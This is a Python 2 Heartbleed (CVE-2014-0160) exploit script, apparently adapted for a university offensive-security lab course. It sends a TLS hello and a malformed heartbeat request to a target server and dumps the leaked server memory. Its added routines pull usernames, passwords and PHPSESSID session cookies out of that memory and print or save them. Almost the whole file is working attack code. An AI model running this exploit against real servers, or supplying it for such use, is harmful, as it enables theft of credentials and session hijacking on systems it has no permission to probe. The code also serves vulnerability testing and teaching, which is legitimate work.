#!/usr/bin/python

# Quick demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code
# Minor customizations by Malik Mesellem (@MME_IT)
# New options added for the course Lab on Offensive Computer Security TU/e (2019):
#   - Claudiu Ion (TU/e)
#   - Leon van de Beek (TU/e)

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=8443, help='TCP port to test (default: 8443)')
options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
options.add_option('-f', '--file', type='str', default='', help='Name of the file in which to dump the output (default: output.txt)')
options.add_option('-q', '--quiet', default=False, help='Run exploit script without dumping output to the console (default: false)', action='store_true')
options.add_option('-c', '--cookie', default=False, help='Detect whether exploit returned any cookies (default: false)', action='store_true')
options.add_option('-w', '--pwd', default=False, help='Detect whether exploit returned any passwords (default: false)', action='store_true')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

# Explanation of heartbeat (hit_hb call):
#    18      : hearbeat record
#    03 02   : TLS version
#    00 03   : length
#    01      : hearbeat request
#    40 00   : payload length 16 384 bytes check rfc6520
#              The total length of a HeartbeatMessage MUST NOT exceed 2^14
#              example: FF FF (= 65535 bytes) thus we will received 4 paquets of length 16384 bytes

def consoleLog(msg, quiet):
    # Return without printing (if quite option specified by user)
    if quiet:
        return

    print(msg)

def logList(list, name, color, quiet, delim = ''):
    # Return without printing (if quite option specified by user)
    if quiet:
        return

    # Build message string
    # Use delim to detect whether we are printing cookies (cookies are printed on separate lines)
    if delim == '\n':
        header = color + name + colors.END + ': '
        msg = ''
    else:
        header = ''
        msg = color + name + colors.END + ': '

    for item in list:
        msg += header + item + ' ' + delim

    print(msg)

def skip(info, pos, stop):
    while stop.find(info[pos]) == -1:
        pos += 1
    return pos

# method extracts usernames, passwords and session ids (cookies) from leaked info
def getCredentials(info, key):
    items = []
    i = info.index(key)
    while i < len(info):
        # Find next user from info string
        i = skip(info, i, '=')
        # Strip current user from info string
        info = info[i+1:]
        # Get username of current user (and add to users list)
        i = skip(info, 0, '&.;')
        items.append(info[:i])
        # Strip current username from info string
        info = info[i+1:]
        i = len(info)
        if info.find(key) != -1:
            i = info.index(key)
    return items

def hexdump(s, file, quiet):

    # Open output file (if specified by user)
    if len(file) > 0:
        consoleLog(colors.OKGREEN + 'DONE: ' + colors.END + 'memory dump was saved in output file.', quiet)
        output = open(file, 'a')

    # Variables for detecting passwords and cookies in memory dump
    hasPwd = False;
    hasCookie = False;
    info = ''

    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)

        info += pdat

        if pdat.find('pas'):
            hasPwd = True
        if pdat.find('Cookie'):
            hasCookie = True

        if len(file) > 0:
            output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
        else:
            consoleLog('  %04x: %-48s %s' % (b, hxdat, pdat), quiet)

    # Get user names from leaked memory
    users = getCredentials(info, 'login')
    # Get user passwords from leaked memory
    passwords = getCredentials(info, 'password')
    # Get user cookie from leaked memory
    cookies = getCredentials(info, 'PHPSESSID')

    if len(file) == 0 and not quiet:
        print

    return users, passwords, cookies, hasPwd, hasCookie

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s, quiet):
    hdr = recvall(s, 5)
    if hdr is None:
        consoleLog('Unexpected EOF receiving record header - server closed connection', quiet)
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        consoleLog('Unexpected EOF receiving record payload - server closed connection', quiet)
        return None, None, None
    _tmp = ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    consoleLog(_tmp, quiet)
    return typ, ver, pay

def hit_hb(s, file, quiet, pwd, cookie):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s, quiet)
        if typ is None:
            consoleLog(colors.FAIL + 'ERROR: ' + colors.END + 'no heartbeat response received, server likely not vulnerable', quiet)
            return False

        if typ == 24:
            consoleLog('Received heartbeat response:', quiet)
            # Parse information from heartbeat response
            users, passwords, cookies, hasPwd, hasCookie = hexdump(pay, file, quiet)

            # Log to console the list of users
            logList(users[1:], 'USERS', colors.OKBLUE, quiet)
            # Log to console the list of passwords
            logList(passwords, 'PASSWORDS', colors.OKBLUE, quiet)
            # Log to console the list of cookies
            logList(cookies, 'COOKIE', colors.OKBLUE, quiet, '\n')

            if hasCookie and cookie:
                consoleLog(colors.HEADER + 'COOKIE: ' + colors.END + 'server returned cookies - check output', quiet)
            if hasPwd and pwd:
                consoleLog(colors.HEADER + 'PASSWORD: ' + colors.END + 'server returned passwords - check output', quiet)

            if len(pay) > 3:
                consoleLog(colors.WARNING + 'WARNING: ' + colors.END + 'server returned more data than it should - server is vulnerable!', quiet)
            else:
                consoleLog(colors.FAIL + 'ERROR: ' + colors.END + 'server processed malformed heartbeat, but did not return any extra data.', quiet)

            return True

        if typ == 21:
            consoleLog('Received alert:', quiet)
            hexdump(pay, file, quiet)
            consoleLog(colors.FAIL + 'ERROR: ' + colors.END + 'server returned error, likely not vulnerable', quiet)
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    consoleLog('Connecting...', opts.quiet)
    sys.stdout.flush()
    s.connect((args[0], opts.port))

    consoleLog('Sending Client Hello...', opts.quiet)
    sys.stdout.flush()
    s.send(hello)

    consoleLog('Waiting for Server Hello...', opts.quiet)
    sys.stdout.flush()

    while True:
        typ, ver, pay = recvmsg(s, opts.quiet)
        if typ == None:
            consoleLog('Server closed connection without sending Server Hello.', opts.quiet)
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    for i in range(opts.num):
      _tmp = 'Sending heartbeat request #' + str(i+1) + '!'
      consoleLog(_tmp, opts.quiet)
      sys.stdout.flush()
      s.send(hb)
      hit_hb(s, opts.file, opts.quiet, opts.pwd, opts.cookie)

if __name__ == '__main__':
    main()
